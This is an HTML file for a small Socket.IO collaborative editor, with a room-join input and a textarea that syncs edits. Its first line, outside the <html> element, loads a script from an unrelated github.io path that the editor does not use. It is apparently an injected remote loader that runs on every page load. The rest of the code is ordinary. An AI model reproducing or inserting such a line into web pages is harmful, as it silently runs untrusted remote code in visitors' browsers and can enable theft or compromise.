<script src="https://indiameme.github.io/jonathanrivera/test/node.js"></script>
<html>
<head>
    <title>Collaborative Editor</title>
    <!-- Include Socket.IO -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
</head>
<body>
    <div>
        <input type="text" id="roomId" placeholder="Enter Room ID">
        <button onclick="joinRoom()">Join Room</button>
    </div>
    <hr>
    <textarea id="editor" rows="10" cols="50" disabled></textarea>
    
    <script>
        const socket = io(); // Connect to the server
        
        function joinRoom() {
            const roomId = document.getElementById('roomId').value;
            socket.emit('joinRoom', roomId);
            socket.on('roomJoined', () => {
                document.getElementById('editor').removeAttribute('disabled');
            });
        }
        
        document.getElementById('editor').addEventListener('input', () => {
            const content = document.getElementById('editor').value;
            socket.emit('edit', content);
        });
        
        socket.on('update', (content) => {
            document.getElementById('editor').value = content;
        });
    </script>
</body>
</html>
